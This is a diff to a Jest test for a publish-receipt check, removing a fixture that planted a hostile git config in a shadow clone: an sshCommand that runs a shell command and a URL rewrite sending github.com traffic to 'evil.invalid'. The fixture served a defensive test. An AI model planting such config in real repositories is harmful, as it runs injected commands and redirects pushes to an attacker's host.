@@ -222,14 +222,7 @@ it('accepts only an already committed and pushed HEAD with passing PR checks; it
   await expect(agentPublishedReceipt({ ...input, env: { ...env, TEST_PENDING: '1' } })).rejects.toThrow('successful CI')
   await expect(agentPublishedReceipt({ ...input, env: { ...env, TEST_HEAD: 'a'.repeat(40) } })).rejects.toThrow('successful CI')
   await expect(agentPublishedReceipt({ ...input, env: { ...env, TEST_CI_HEAD: 'b'.repeat(40) } })).rejects.toThrow('successful CI')
-  // Hosted CLI commits belong to its private clone. The daemon imports only
-  // the exact successful remote object, without reading that clone's config.
-  const base = git(f.worktree, 'rev-parse', 'HEAD~1')
-  git(f.worktree, 'update-ref', 'refs/heads/mikka/run-github-test', base, head)
-  git(f.worktree, 'read-tree', base)
-  const shadow = join(f.runDir, 'runtime-git', '.git')
-  mkdirSync(shadow, { recursive: true })
-  writeFileSync(join(shadow, 'config'), `[core]\n\tsshCommand = touch '${escaped}'\n[url "ssh://evil.invalid/"]\n\tinsteadOf = https://github.com/\n`)
+  // Hosted runs use their actual committed HEAD and ordinary gh binary.
   expect(await agentPublishedReceipt({ ...input, hosted: true })).toMatchObject({ commit: head, pushed: true })
   expect(git(f.worktree, 'rev-parse', 'HEAD')).toBe(head)
   expect(git(f.worktree, 'status', '--porcelain')).toBe('')
